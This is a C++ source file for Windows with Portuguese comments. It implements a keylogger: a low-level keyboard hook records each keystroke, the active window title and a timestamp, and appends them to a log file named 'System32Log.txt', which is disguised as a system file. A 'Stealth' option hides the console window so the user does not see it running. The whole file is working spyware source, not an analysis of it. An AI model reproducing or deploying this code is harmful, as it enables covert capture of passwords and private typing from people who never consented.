#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>

// define se a janela é visível ou não.
#define visible // (visível/ invisível)

// variável para armazenar o HANDLE no hook. Não declará-lo em nenhum outro lugar, em seguida, globalmente
// ou você terá problemas já que cada função usa essa variável.
HHOOK _hook;

// Essa estrutura contém os dados recebidos pelo retorno do hook. Como você vê na função callback
// contém o que você vai precisar: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream OUTPUT_FILE;

extern char lastwindow[256];

// Essa é a função de retorno. Considere o evento que é gerado quando, neste caso,
// uma tecla é pressionada.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// a ação é valida: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam é o indicador para a estrutura que contém os dados necessários, portanto, converta e atribua-o ao kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			// salva o arquivo
			Save(kbdStruct.vkCode);
		}
	}

	// chame o próximo hook na cadeia de hook. Isso é necessário ou a cadeia de hook quebrará e o hook parará.
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Defina o hook e configure-o para usar a função de retorno acima
	// WH_KEYBOARD_LL significa que definirá um hook de teclado de baixo nível. Mais informações sobre isso em MSDN.
	// Os últimos 2 parâmetros são NULL, 0 porque a função callback está no mesmo tópico e janela que a
	// função que define e executar o hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    char lastwindow[256];

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignora cliques do mouse

	HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout;
    if (foreground) {
				// obter o layout do teclado do tópico
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);

        if(strcmp(window_title, lastwindow)!=0) {
            strcpy(lastwindow, window_title);

            // retorna horário
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);

            OUTPUT_FILE << "\n\n[Window: "<< window_title << " - at " << s << "] ";
        }
    }


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
        OUTPUT_FILE << "[DEL]";
	else if (key_stroke == VK_RETURN)
		OUTPUT_FILE <<  "\n";
	else if (key_stroke == VK_SPACE)
		OUTPUT_FILE << " ";
	else if (key_stroke == VK_TAB)
		OUTPUT_FILE << "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		OUTPUT_FILE << "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		OUTPUT_FILE << "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		OUTPUT_FILE << "[ESCAPE]";
	else if (key_stroke == VK_END)
		OUTPUT_FILE << "[END]";
	else if (key_stroke == VK_HOME)
		OUTPUT_FILE << "[HOME]";
	else if (key_stroke == VK_LEFT)
		OUTPUT_FILE << "[LEFT]";
	else if (key_stroke == VK_UP)
		OUTPUT_FILE << "[UP]";
	else if (key_stroke == VK_RIGHT)
		OUTPUT_FILE << "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		OUTPUT_FILE << "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		OUTPUT_FILE << ".";
	else if (key_stroke == 189 || key_stroke == 109)
		OUTPUT_FILE << "-";
	else if (key_stroke == 20)
		OUTPUT_FILE << "[CAPSLOCK]";
	else {
        char key;
        // verifica caixas altas
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // verifica tecla shift
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;
        }

				// mapeia a tecla virtual de acordo com o layout do teclado
        key = MapVirtualKeyExA(key_stroke,MAPVK_VK_TO_CHAR, layout);


        if (!lowercase) key = tolower(key);
		OUTPUT_FILE <<  char(key);
    }
	// em vez de abrir e fechar os manipuladores de arquivos todas as vezes, mantem o arquivo aberto e atualizado.
    OUTPUT_FILE.flush();
	return 0;
}

void Stealth()
{
	#ifdef visible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // janela visível
	#endif

	#ifdef invisible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // janela invisível
	#endif
}

int main()
{
	// arquivo de saída aberto no modo de anexação
    OUTPUT_FILE.open("System32Log.txt",std::ios_base::app);

	Stealth();

	SetHook();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}
